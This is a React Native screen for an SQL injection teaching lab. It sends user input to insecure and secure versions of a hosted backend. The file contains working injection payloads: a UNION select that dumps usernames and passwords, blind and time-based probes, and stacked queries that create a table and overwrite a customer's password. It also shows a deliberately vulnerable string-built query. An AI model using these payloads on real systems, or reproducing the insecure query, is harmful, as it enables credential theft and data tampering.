import React, { useState } from "react";
import {
  Button,
  ScrollView,
  StyleSheet,
  Switch,
  Text,
  TextInput,
  TouchableOpacity,
  View,
} from "react-native";

const BASE_URL = "https://core-service-znxz.onrender.com";

export default function SqlInjectionScreen() {
  const [isSecure, setIsSecure] = useState(false);
  const [attackType, setAttackType] = useState("union");
  const [input, setInput] = useState("");
  const [result, setResult] = useState("");
  const [showCode, setShowCode] = useState(false);
  const [createData, setCreateData] = useState({
    customerName: "",
    contactName: "",
    address: "",
    city: "",
    postalCode: "",
    country: "",
    password: "",
    username: "",
  });

  const getApiPath = () => {
    const prefix = isSecure ? "/sqli/safe" : "/sqli";

    return `${prefix}/${attackType}`;
  };

  const runAttack = async () => {
    try {
      const url = new URL(BASE_URL + getApiPath());
      console.log(url.toString());
      if (attackType === "create") {
        const body = createData;
        const res = await fetch(BASE_URL + getApiPath(), {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        const data = await res.json();
        if (data) setResult(data.message || JSON.stringify(data));
      } else {
        const params = { id: input };
        url.search = new URLSearchParams(params).toString();
        const res = await fetch(url);
        const data = await res.json();
        if (data) setResult(data.message || JSON.stringify(data));
      }
    } catch (e) {
      setResult("Error: " + e.message);
    }
  };

  const renderAttackButton = (type: string) => (
    <TouchableOpacity
      key={type}
      style={[styles.attackBtn, attackType === type && styles.attackActive]}
      onPress={() => setAttackType(type)}
    >
      <Text>{type.toUpperCase()}</Text>
    </TouchableOpacity>
  );

  const examplePayload = {
    union: `0 UNION SELECT 1,username,password,NULL,NULL,NULL,NULL,NULL,NULL FROM customers--`,
    blind: `' OR SUBSTRING((SELECT username FROM customers LIMIT 1),1,1)='a'--`,
    time: `1; SELECT pg_sleep(3)--`,
    create: `test'; CREATE TABLE hacked(data TEXT); --`,
  };

  const autoFillCreate = () => {
    setCreateData({
      customerName:
        "Alice', 'x', 'x', 'x', '00000', 'US', 'tmppass', 'stacked_user'); UPDATE customers SET password='attacker_hash' WHERE customer_name='Alice'--",
      contactName: "x",
      address: "x",
      city: "x",
      postalCode: "00000",
      country: "US",
      password: "pass",
      username: "exfil_user",
    });
  };

  return (
    <ScrollView style={styles.container}>
      <Text style={styles.title}>SQL Injection Lab</Text>
      {/* Toggle Secure */}
      <View style={styles.row}>
        <Text style={{ color: isSecure ? "green" : "red" }}>
          {isSecure ? "Secure Mode" : "Insecure Mode"}
        </Text>
        <Switch value={isSecure} onValueChange={setIsSecure} />
      </View>

      {/* Attack Type */}
      <View style={styles.row}>
        {["union", "blind", "time", "create"].map(renderAttackButton)}
      </View>

      {/* Inputs */}
      {attackType !== "create" && (
        <TextInput
          style={styles.input}
          placeholder="Input"
          value={input}
          onChangeText={setInput}
        />
      )}
      {/* Create */}
      {attackType === "create" && (
        <>
          <Text style={styles.label}>Create Payload:</Text>

          {Object.keys(createData).map((key) => (
            <TextInput
              key={key}
              style={styles.input}
              placeholder={key}
              value={createData[key]}
              onChangeText={(value) =>
                setCreateData({ ...createData, [key]: value })
              }
            />
          ))}
        </>
      )}

      {/* Auto payload */}
      <Button
        title="Auto Inject Payload"
        onPress={() => {
          if (attackType === "create") {
            autoFillCreate();
          } else {
            setInput(examplePayload[attackType]);
          }
        }}
      />

      <View style={{ height: 10 }} />

      <Button title="Run Attack" onPress={runAttack} />

      {/* Result */}
      <Text style={styles.label}>Result:</Text>
      <Text style={styles.box}>{result}</Text>
      {/* Show Code */}
      <TouchableOpacity onPress={() => setShowCode(!showCode)}>
        <Text style={styles.showCode}>
          {showCode ? "Hide Code ▲" : "Show Code ▼"}
        </Text>
      </TouchableOpacity>

      {showCode && (
        <Text style={styles.code}>
          {isSecure
            ? `// SECURE
const query = "SELECT * FROM users WHERE username = ? AND password = ?";
db.query(query, [username, password]);`
            : `// INSECURE
const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;`}
        </Text>
      )}
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: { padding: 20 },
  title: { fontSize: 22, fontWeight: "bold", marginBottom: 20 },

  row: {
    flexDirection: "row",
    alignItems: "center",
    justifyContent: "space-between",
    marginBottom: 10,
  },

  attackBtn: {
    padding: 8,
    borderWidth: 1,
    marginRight: 5,
  },

  attackActive: {
    backgroundColor: "#ddd",
  },

  input: {
    borderWidth: 1,
    padding: 10,
    marginBottom: 10,
  },

  label: {
    marginTop: 15,
    fontWeight: "bold",
  },

  box: {
    backgroundColor: "#eee",
    padding: 10,
    marginTop: 5,
  },

  showCode: {
    marginTop: 15,
    color: "blue",
  },

  code: {
    backgroundColor: "#222",
    color: "#0f0",
    padding: 10,
    marginTop: 10,
    fontFamily: "monospace",
  },
});
